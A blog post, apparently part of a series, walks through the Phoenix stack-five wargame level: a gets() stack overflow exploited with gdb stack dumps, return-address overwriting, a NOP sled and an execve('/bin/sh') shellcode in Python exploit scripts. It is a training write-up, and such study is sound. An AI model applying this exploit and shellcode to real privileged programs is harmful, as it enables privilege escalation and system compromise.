<!DOCTYPE html><html lang="en-US" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="pv-cache-enabled" content="false"><meta name="generator" content="Jekyll v4.2.1" /><meta property="og:title" content="Phoenix Stack-Five" /><meta name="author" content="Marius Kimmina" /><meta property="og:locale" content="en_US" /><meta name="description" content="0x0. Introduction For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One). This level aims to introduce its participants to the concept of shell-code, thus allowing us to execute code that was not originally part of the program. For this challenge there is no clear goal as to what we want to achieve." /><meta property="og:description" content="0x0. Introduction For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One). This level aims to introduce its participants to the concept of shell-code, thus allowing us to execute code that was not originally part of the program. For this challenge there is no clear goal as to what we want to achieve." /><link rel="canonical" href="https://mindslave.github.io/posts/PhoenixStackFive/" /><meta property="og:url" content="https://mindslave.github.io/posts/PhoenixStackFive/" /><meta property="og:site_name" content="Marius Kimmina" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2019-11-24T07:10:00+01:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Phoenix Stack-Five" /><meta name="twitter:site" content="@Mindslave4" /><meta name="twitter:creator" content="@Marius Kimmina" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"author":{"@type":"Person","name":"Marius Kimmina"},"description":"0x0. Introduction For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One). This level aims to introduce its participants to the concept of shell-code, thus allowing us to execute code that was not originally part of the program. For this challenge there is no clear goal as to what we want to achieve.","headline":"Phoenix Stack-Five","url":"https://mindslave.github.io/posts/PhoenixStackFive/","@type":"BlogPosting","dateModified":"2021-04-17T14:04:16+02:00","datePublished":"2019-11-24T07:10:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://mindslave.github.io/posts/PhoenixStackFive/"},"@context":"https://schema.org"}</script><title>Phoenix Stack-Five | Marius Kimmina</title><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="icon" href="/assets/img/favicons/favicon.ico" type="image/x-icon"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon.png"><link rel="apple-touch-icon" href="/assets/img/favicons/apple-icon-precomposed.png"><link rel="apple-touch-icon" sizes="57x57" href="/assets/img/favicons/apple-icon-57x57.png"><link rel="apple-touch-icon" sizes="60x60" href="/assets/img/favicons/apple-icon-60x60.png"><link rel="apple-touch-icon" sizes="72x72" href="/assets/img/favicons/apple-icon-72x72.png"><link rel="apple-touch-icon" sizes="76x76" href="/assets/img/favicons/apple-icon-76x76.png"><link rel="apple-touch-icon" sizes="114x114" href="/assets/img/favicons/apple-icon-114x114.png"><link rel="apple-touch-icon" sizes="120x120" href="/assets/img/favicons/apple-icon-120x120.png"><link rel="apple-touch-icon" sizes="144x144" href="/assets/img/favicons/apple-icon-144x144.png"><link rel="apple-touch-icon" sizes="152x152" href="/assets/img/favicons/apple-icon-152x152.png"><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-icon-180x180.png"><link rel="icon" type="image/png" sizes="192x192" href="/assets/img/favicons/android-icon-192x192.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="96x96" href="/assets/img/favicons/favicon-96x96.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/manifest.json"><meta name='msapplication-config' content='/assets/img/favicons/browserconfig.xml'><meta name="msapplication-TileColor" content="#ffffff"><meta name="msapplication-TileImage" content="/assets/img/favicons/ms-icon-144x144.png"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="cdn.jsdelivr.net"><link rel="dns-prefetch" href="cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css" integrity="sha256-LA89z+k9fjgMKQ/kq4OO2Mrf8VltYml/VES+Rg0fh20=" crossorigin="anonymous"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css" integrity="sha256-+N4/V/SbAFiW1MPBCXnfnP9QSN3+Keu+NlB+0ev/YKQ=" crossorigin="anonymous"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script defer src="https://cdn.jsdelivr.net/combine/npm/popper.js@1.15.0,npm/bootstrap@4/dist/js/bootstrap.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script defer src="/app.js"></script> <script defer src="https://www.googletagmanager.com/gtag/js?id=UA-208027930-1"></script> <script> document.addEventListener("DOMContentLoaded", function(event) { window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-208027930-1'); }); </script> <script src="https://www.googleoptimize.com/optimize.js?id=OPT-K4ZZSSF"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/images/avatar/mk_avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Marius Kimmina</a></div><div class="site-subtitle font-italic">IT-Security, Hacking and DevOps</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/Mindslave" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/Mindslave4" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href="https://www.linkedin.com/in/marius-kimmina-33a328201" aria-label="linkedin" class="order-5" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Posts </a> </span> <span>Phoenix Stack-Five</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Phoenix Stack-Five</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Marius Kimmina </span> <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Sun, Nov 24, 2019, 7:10 AM +0100" prep="on" > Nov 24, 2019 <i class="unloaded">2019-11-24T07:10:00+01:00</i> </span></div><div> <span> <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Sat, Apr 17, 2021, 9:04 PM +0900" prefix="Updated " > Apr 17 <i class="unloaded">2021-04-17T14:04:16+02:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="1775 words">9 min</span></div></div><div class="post-content"><h3 id="0x0-introduction">0x0. Introduction</h3><p>For a full introduction to this series and setup description please look at the first post (Phoenix Stack-Zero and One). This level aims to introduce its participants to the concept of shell-code, thus allowing us to execute code that was not originally part of the program. For this challenge there is no clear goal as to what we want to achieve.</p><h3 id="0x1-taking-a-look-at-the-source-code">0x1 taking a look at the source code</h3><div class="language-c highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre><span class="cp">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;string.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="cp">#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"
</span>
<span class="kt">char</span> <span class="o">*</span><span class="nf">gets</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">);</span>

<span class="kt">void</span> <span class="nf">start_level</span><span class="p">()</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
  <span class="n">gets</span><span class="p">(</span><span class="n">buffer</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">"%s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">BANNER</span><span class="p">);</span>
  <span class="n">start_level</span><span class="p">();</span>
<span class="p">}</span>
</pre></table></code></div></div><p>As you can see there is nothing more to this program then a buffer and a gets call, a standard bufferoverflow. This time we don’t want to manipulate existing parts of the program but much rather we would like to create a new part of the program.</p><h5 id="what-can-we-do-with-this">What can we do with this?</h5><p>Short answer: A lot.<br /> Longer answer: We could use this to execute a shell (/bin/sh) and if the program has more privileges then we do, we can use that for privilege escalation. Lets say the program has root-privileges because it needs them for some arbitrary reason, a shell spawned by this program would then be a root shell and give us total control of the system.</p><h3 id="exploiting-the-program">Exploiting the program</h3><p>To find out how much input exactly the program can take before the buffer overflows I wanted to use the alphabet again, no luck tho this time the buffer could handle that. Also, yes, i could have looked in the source code and realise that “char buffer[128];” is quite a bit larger this time and yes one could also do the math to find out exactly how much input is needed. Fuzzing is more fun tho.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ
[Inferior 1 (process 328) exited normally]
</pre></table></code></div></div><p>Fear not tho, there are also lowercase letters with which we can go even further. I came up with the following padding for my overflow where I “AAAA” at the end is overwriting the return pointer:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhiiiijjjjkkkAAAA
</pre></table></code></div></div><p>Now after the buffer we start overwriting the return pointer, which leads to a segmentation fault because the address we tried to return to with our test input does not exists. That’s not really what we want tho, we want the program to return to an existing area of memory, one that we control, that’s the stack. Next thing I did was to set a breakpoint at the end of “start_level” function to observe the stack</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>(gdb) disassemble start_level
Dump of assembler code for function start_level:
   0x000000000040058d &lt;+0&gt;:	push   rbp
   0x000000000040058e &lt;+1&gt;:	mov    rbp,rsp
   0x0000000000400591 &lt;+4&gt;:	add    rsp,0xffffffffffffff80
   0x0000000000400595 &lt;+8&gt;:	lea    rax,[rbp-0x80]
   0x0000000000400599 &lt;+12&gt;:	mov    rdi,rax
   0x000000000040059c &lt;+15&gt;:	call   0x4003f0 &lt;gets@plt&gt;
   0x00000000004005a1 &lt;+20&gt;:	nop
   0x00000000004005a2 &lt;+21&gt;:	leave  
   0x00000000004005a3 &lt;+22&gt;:	ret    
End of assembler dump.
(gdb) break *0x4005a1
Breakpoint 1 at 0x4005a1
</pre></table></code></div></div><p>We also have to take a look at main to find the Address that we want to return to</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
</pre><td class="rouge-code"><pre>Dump of assembler code for function main:
   0x00000000004005a4 &lt;+0&gt;:	push   rbp
   0x00000000004005a5 &lt;+1&gt;:	mov    rbp,rsp
   0x00000000004005a8 &lt;+4&gt;:	sub    rsp,0x10
   0x00000000004005ac &lt;+8&gt;:	mov    DWORD PTR [rbp-0x4],edi
   0x00000000004005af &lt;+11&gt;:	mov    QWORD PTR [rbp-0x10],rsi
   0x00000000004005b3 &lt;+15&gt;:	mov    edi,0x400620
   0x00000000004005b8 &lt;+20&gt;:	call   0x400400 &lt;puts@plt&gt;
   0x00000000004005bd &lt;+25&gt;:	mov    eax,0x0
   0x00000000004005c2 &lt;+30&gt;:	call   0x40058d &lt;start_level&gt;
   0x00000000004005c7 &lt;+35&gt;:	mov    eax,0x0
   0x00000000004005cc &lt;+40&gt;:	leave  
   0x00000000004005cd &lt;+41&gt;:	ret    
End of assembler dump.
</pre></table></code></div></div><p>As you can see “0x00000000004005c7” is the next address after “start_level” so that’s the original return address. Why do we need to know this? Because that’s the address we will look out for on the stack. So now lets run the program with some simple input….how about the alphabet?….and then we will take a look at the stack</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>(gdb) run
Starting program: /opt/phoenix/amd64/stack-five
Welcome to phoenix/stack-five, brought to you by https://exploit.education
AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ

(gdb) x/48wx $rsp
0x7fffffffe480:	0x41414141	0x42424242	0x43434343	0x44444444
0x7fffffffe490:	0x45454545	0x46464646	0x47474747	0x48484848
0x7fffffffe4a0:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0x7fffffffe4b0:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0x7fffffffe4c0:	0x51515151	0x52525252	0x53535353	0x54545454
0x7fffffffe4d0:	0x55555555	0x56565656	0x57575757	0x58585858
0x7fffffffe4e0:	0x59595959	0x5a5a5a5a	0xf7db0000	0x00007fff
0x7fffffffe4f0:	0xffffe578	0x00007fff	0xffffe520	0x00007fff
0x7fffffffe500:	0xffffe520	0x00007fff	0x004005c7	0x00000000
0x7fffffffe510:	0xffffe578	0x00007fff	0x00000000	0x00000002
0x7fffffffe520:	0x00000002	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe530:	0x00000000	0x00000000	0xffffe570	0x00007fff
</pre></table></code></div></div><p>And can you find the return address? If not take a closer look at this line “0x7fffffffe500: 0xffffe520 0x00007fff 0x004005c7 0x00000000”. But now we still need to find the exact point to overwrite the return address. You can of course try to figure that out on your own or you just use this</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhiiAAAAAAAA
</pre></table></code></div></div><p>Now we only need to replace the “AAAAAAAA” at the end of the string with a return address of our choice. So lets jump to the beginning of the stack “0x7fffffffe480”. which we need to transform to little endian and already format it for the exploit “\x80\xe4\xff\xff\xff\x7f”</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre>AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhii\x80\xe4\xff\xff\xff\x7f
``


##### A simple proof of concept

I prepared a simple python script 

```py
padding = "AAAABBBBCCCCDDDD\xcc\xcc\xcc\xccFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhii"
ret_address = "\xa0\xe4\xff\xff\xff\x7f" 
print(padding + ret_address)
</pre></table></code></div></div><p>Here my return address points back to the stack, to exactly the location where i placed some “/xcc” instruction, which are used by debuggers to set a breakpoint.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>user@phoenix-amd64:/tmp$ python exploit.py &gt; payload

(gdb) run &lt; /tmp/payload
</pre></table></code></div></div><p>We then hit our breakpoint and the stack looks like this</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>(gdb) x/48wx $rsp
0x7fffffffe490:	0x41414141	0x42424242	0x43434343	0x44444444
0x7fffffffe4a0:	0xcccccccc	0x46464646	0x47474747	0x48484848
0x7fffffffe4b0:	0x49494949	0x4a4a4a4a	0x4b4b4b4b	0x4c4c4c4c
0x7fffffffe4c0:	0x4d4d4d4d	0x4e4e4e4e	0x4f4f4f4f	0x50505050
0x7fffffffe4d0:	0x51515151	0x52525252	0x53535353	0x54545454
0x7fffffffe4e0:	0x55555555	0x56565656	0x57575757	0x58585858
0x7fffffffe4f0:	0x59595959	0x615a5a5a	0x62616161	0x63626262
0x7fffffffe500:	0x64636363	0x65646464	0x66656565	0x67676666
0x7fffffffe510:	0x68686767	0x69696868	0xffffe4a0	0x00007fff
0x7fffffffe520:	0xffffe588	0x00007fff	0x00000000	0x00000001
0x7fffffffe530:	0x00000001	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe540:	0x00000000	0x00000000	0xffffe580	0x00007fff
</pre></table></code></div></div><p>You can see the return address in this line: 0x7fffffffe510: 0x68686767 0x69696868 0xffffe4a0 0x00007fff<br /> Which will lead to us jumping here: 0x7fffffffe4a0: 0xcccccccc 0x46464646 0x47474747 0x48484848</p><p>Lets continue the execution of the program</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre>(gdb) c
Continuing.

Program received signal SIGTRAP, Trace/breakpoint trap.
0x00007fffffffe4a1 in ?? ()
</pre></table></code></div></div><p>Awesome. The CC instruction got executed.</p><h5 id="getting-shellcode-to-exploit-the-program">Getting shellcode to exploit the program</h5><p>There is a lot of excellent shellcode for this out there on the Internet, so I am not going to bother with writing my own. “\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05”</p><p>We replace the CC instruction from my PoC with the shellcode and trim our payload accordingly. The adjusted version of my python script then looks like this:</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="n">padding</span> <span class="o">=</span> <span class="s">"AAAABBBBCCCCDDDD</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s">LLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZaaaabbbbccccddddeeeefffgggghhhhiii"</span>
<span class="n">ret_address</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xa0\xe4\xff\xff\xff\x7f</span><span class="s">"</span> 
<span class="k">print</span><span class="p">(</span><span class="n">padding</span> <span class="o">+</span> <span class="n">ret_address</span><span class="p">)</span>
</pre></table></code></div></div><p>And Executing it leads to:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>user@phoenix-amd64:/tmp$ python exploit.py &gt; payload

(gdb) run &lt; /tmp/payload 
Starting program: /opt/phoenix/amd64/stack-five &lt; /tmp/payload
Welcome to phoenix/stack-five, brought to you by https://exploit.education

Breakpoint 1, 0x00000000004005a1 in start_level ()

(gdb) x/48wx $rsp
0x7fffffffe490:	0x41414141	0x42424242	0x43434343	0x44444444
0x7fffffffe4a0:	0xbb48c031	0x91969dd1	0xff978cd0	0x53dbf748
0x7fffffffe4b0:	0x52995f54	0xb05e5457	0x4c050f3b	0x4d4c4c4c
0x7fffffffe4c0:	0x4e4d4d4d	0x4f4e4e4e	0x504f4f4f	0x51505050
0x7fffffffe4d0:	0x52515151	0x53525252	0x54535353	0x55545454
0x7fffffffe4e0:	0x56555555	0x57565656	0x58575757	0x59585858
0x7fffffffe4f0:	0x5a595959	0x61615a5a	0x62626161	0x63636262
0x7fffffffe500:	0x64646363	0x65656464	0x66666565	0x67676766
0x7fffffffe510:	0x68686867	0x69696968	0xffffe4a0	0x00007fff
0x7fffffffe520:	0xffffe588	0x00007fff	0x00000000	0x00000001
0x7fffffffe530:	0x00000001	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe540:	0x00000000	0x00000000	0xffffe580	0x00007fff

(gdb) c
Continuing.
process 468 is executing new program: /bin/dash
</pre></table></code></div></div><p>But wait, where is our shell? Well there are two more problem we have to take care of.</p><h5 id="nops-for-stack-safety">NOPs for stack safety</h5><p>What do I mean by “stack safety”? Well, the start address of the stack can change depending on environment variables, for example the path that you are in. If you execute the program from /opt/phoenix/amd64/ the stack will start later than if you execute the program from /tmp because /opt/phoenix/amd64/ is longer and takes more space.</p><p>So since our shellcode does not need all the space available on the stack, its best to fill our Stack with a lot of NOPs (No Operation) Opcodes (x90) and then just jump somewhere in the middle of the nops. Here is how I adjusted my python script for that</p><div class="language-py highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="n">nops</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90</span><span class="s">"</span>
<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span class="s">"</span>
<span class="n">padding</span> <span class="o">=</span> <span class="s">"AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKL"</span>
<span class="n">ret_address</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xb0\xe4\xff\xff\xff\x7f</span><span class="s">"</span> 
<span class="k">print</span><span class="p">(</span><span class="n">nops</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="n">padding</span> <span class="o">+</span> <span class="n">ret_address</span><span class="p">)</span>
</pre></table></code></div></div><p>I added a bunch of \x90s at the beginning and removed letters after our shellcode so that our return address will still be in the right place. I then also changed the return address to jump to somewhere in the middle of all those NOPs. Lets look at the stack with this input in gdb:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>(gdb) x/48wx $rsp
0x7fffffffe490:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4a0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4b0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4c0:	0x90909090	0x90909090	0x90909090	0x90909090
0x7fffffffe4d0:	0xbb48c031	0x91969dd1	0xff978cd0	0x53dbf748
0x7fffffffe4e0:	0x52995f54	0xb05e5457	0x58050f3b	0x59585858
0x7fffffffe4f0:	0x5a595959	0x61615a5a	0x62626161	0x63636262
0x7fffffffe500:	0x64646363	0x65656464	0x66666565	0x67676766
0x7fffffffe510:	0x68686867	0x69696968	0xffffe490	0x00007fff
0x7fffffffe520:	0xffffe588	0x00007fff	0x00000000	0x00000001
0x7fffffffe530:	0x00000001	0x00000000	0xf7d8fd62	0x00007fff
0x7fffffffe540:	0x00000000	0x00000000	0xffffe580	0x00007fff
